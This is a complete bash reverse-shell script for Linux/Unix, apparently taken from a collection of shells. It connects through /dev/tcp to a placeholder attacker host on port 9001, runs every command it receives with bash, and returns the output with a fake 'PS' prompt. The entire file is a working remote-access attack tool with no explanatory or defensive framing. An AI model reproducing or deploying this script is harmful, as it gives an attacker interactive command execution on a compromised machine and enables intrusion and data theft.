#Linux / Unix
#!/bin/bash

host="IP_ADDRESS"
port=9001

exec 3<>/dev/tcp/$host/$port 2>/dev/null
if [ $? -ne 0 ]; then
    echo "Connection error"
    exit 1
fi

while true; do
    # Read data from server
    if ! IFS= read -r -u 3 data; then
        break
    fi

    command=$(echo "$data" | tr -d '\r\n')

    # Execute command with timeout of 30 seconds
    output=$(timeout 30 bash -c "$command" 2>&1)
    status=$?

    if [ $status -eq 124 ]; then
        sendback="Error: Command timed out"
    elif [ $status -ne 0 ]; then
        sendback="Error: $output"
    else
        sendback="$output"
    fi

    current_dir=$(pwd)
    sendback+=$'\nPS '"$current_dir"' > '

    # Send response back
    printf '%s\n' "$sendback" >&3
done

exec 3>&-
exec 3<&-